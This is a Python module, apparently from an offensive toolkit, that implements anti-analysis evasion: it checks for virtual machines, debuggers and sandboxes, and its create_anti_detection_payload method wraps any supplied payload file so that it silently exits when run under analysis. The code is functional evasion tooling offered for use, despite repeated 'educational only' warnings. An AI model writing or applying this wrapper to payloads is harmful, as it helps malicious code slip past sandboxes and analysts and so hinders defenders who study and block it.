"""
Anti-Detection Techniques
WARNING: For authorized testing and educational purposes only.
"""
import os
import platform
import sys
import ctypes
from typing import Dict, Optional
import tempfile


class AntiDetection:
    """Anti-detection techniques for payloads"""
    
    def __init__(self):
        self.system = platform.system()
    
    def detect_vm(self) -> Dict:
        """Detect if running in virtual machine"""
        indicators = []
        
        # Check for VM artifacts
        vm_indicators = [
            "VMware", "VirtualBox", "VBOX", "QEMU", "Xen",
            "Parallels", "Hyper-V", "KVM"
        ]
        
        # Check system info
        if self.system == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                   r"SYSTEM\CurrentControlSet\Services")
                for indicator in vm_indicators:
                    try:
                        winreg.OpenKey(key, indicator)
                        indicators.append(f"Found {indicator} service")
                    except:
                        pass
            except:
                pass
        
        # Check MAC address (VM vendors)
        try:
            import uuid
            mac = uuid.getnode()
            # VMware MAC: 00:0C:29, 00:50:56
            # VirtualBox MAC: 08:00:27
            mac_str = ':'.join([f'{(mac >> elements) & 0xff:02x}' 
                               for elements in range(0, 8*6, 8)][::-1])
            if mac_str.startswith(('00:0c:29', '00:50:56', '08:00:27')):
                indicators.append(f"VM MAC address detected: {mac_str}")
        except:
            pass
        
        return {
            "is_vm": len(indicators) > 0,
            "indicators": indicators,
            "warning": "Educational only. Use in isolated VM for testing."
        }
    
    def detect_debugger(self) -> Dict:
        """Detect debugger presence"""
        detected = False
        methods = []
        
        if self.system == "Windows":
            # Check for debugger using Windows API
            try:
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent():
                    detected = True
                    methods.append("IsDebuggerPresent API")
            except:
                pass
        
        # Check for common debugger processes
        debugger_processes = ["ollydbg", "x64dbg", "windbg", "ida", "gdb"]
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                if any(debugger in proc_name for debugger in debugger_processes):
                    detected = True
                    methods.append(f"Debugger process: {proc_name}")
        except ImportError:
            pass
        except:
            pass
        
        return {
            "debugger_detected": detected,
            "methods": methods,
            "warning": "Educational only. Use in isolated VM."
        }
    
    def detect_sandbox(self) -> Dict:
        """Detect sandbox environment"""
        indicators = []
        
        # Check for sandbox artifacts
        sandbox_paths = [
            "C:\\analysis", "C:\\sandbox", "C:\\sample",
            "/tmp/sandbox", "/tmp/analysis"
        ]
        
        for path in sandbox_paths:
            if os.path.exists(path):
                indicators.append(f"Sandbox path found: {path}")
        
        # Check system resources (sandboxes often have limited resources)
        try:
            import psutil
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory().total / (1024**3)  # GB
            
            if cpu_count < 2:
                indicators.append("Low CPU count (sandbox indicator)")
            if memory < 2:
                indicators.append("Low memory (sandbox indicator)")
        except:
            pass
        
        return {
            "sandbox_detected": len(indicators) > 0,
            "indicators": indicators,
            "warning": "Educational only. Use in isolated VM."
        }
    
    def create_anti_detection_payload(self, base_payload_path: str) -> Dict:
        """Create payload with anti-detection"""
        with open(base_payload_path, 'r') as f:
            base_code = f.read()
        
        anti_detection_code = f'''"""
Educational Anti-Detection Payload - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import sys
import os

# Anti-VM check
def check_vm():
    vm_indicators = ["VMware", "VirtualBox", "VBOX"]
    for indicator in vm_indicators:
        if indicator in str(os.environ):
            return True
    return False

# Anti-debugger check
def check_debugger():
    if hasattr(sys, 'gettrace') and sys.gettrace():
        return True
    return False

# Anti-sandbox check
def check_sandbox():
    sandbox_paths = ["C:\\\\analysis", "C:\\\\sandbox"]
    for path in sandbox_paths:
        if os.path.exists(path):
            return True
    return False

# Run checks
if check_vm() or check_debugger() or check_sandbox():
    print("Detection environment detected. Exiting.")
    sys.exit(0)

# Original payload
{base_code}
'''
        
        filepath = os.path.join(
            os.path.dirname(base_payload_path),
            f"anti_detection_{os.path.basename(base_payload_path)}"
        )
        
        with open(filepath, 'w') as f:
            f.write(anti_detection_code)
        
        return {
            "type": "anti_detection",
            "file": filepath,
            "original": base_payload_path,
            "features": ["VM detection", "Debugger detection", "Sandbox detection"],
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
